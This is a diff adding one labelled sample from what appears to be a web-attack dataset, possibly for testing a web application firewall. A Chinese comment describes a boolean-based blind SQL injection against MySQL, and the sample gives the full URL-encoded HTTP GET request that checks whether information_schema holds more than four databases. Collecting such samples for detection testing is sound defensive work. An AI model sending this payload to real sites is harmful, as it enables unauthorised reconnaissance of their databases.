@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_布尔注入-06506254
+# 基于布尔注入,攻击者尝试通过执行IF函数来判断信息架构中的数据库数量是否大于4。该sql注入语句中，攻击手段是通过将IF函数嵌入原始查询的条件部分，将子查询(select count(schema_name) from information_schema.schemata)作为参数。该子查询用于计算信息架构中数据库的数量，并通过比较结果与4的大小，返回1或0作为条件判断的结果。攻击目的是是确认信息架构中存在的数据库数量，并根据结果执行有针对性的攻击或进行进一步的侦察。
+GET /?id=1%20and%20if%28%28select%20count%28schema_name%29%20from%20information_schema.schemata%20%29%3E4%2C1%2C0%29&bid=hd_tag_m8mv24d9 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24d9
+RM-PRO-Token: 0514799cbae822a51f127a60e1c8fc9c
+RM-PRO-Time: 1742808375841
+User-Agent: curl/7.83.1
+
